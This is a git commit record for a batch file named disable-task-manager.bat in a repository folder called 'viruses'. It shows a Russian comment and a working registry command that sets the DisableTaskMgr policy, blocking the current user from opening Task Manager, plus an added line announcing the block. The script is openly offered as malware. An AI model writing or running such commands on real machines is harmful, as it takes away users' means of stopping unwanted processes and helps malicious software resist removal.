b1c8e649b42701e6e6bfbef35f8ff6262cd2b8ec
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-04 00:24:05 +0400

    Update disable-task-manager.bat

--- viruses/disable-task-manager.bat
+++ viruses/disable-task-manager.bat
@@ -1,2 +1,3 @@
 :: (Запрет открытия диспетчера задач)
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f
+echo Диспетчер задач запрещён к запуску.
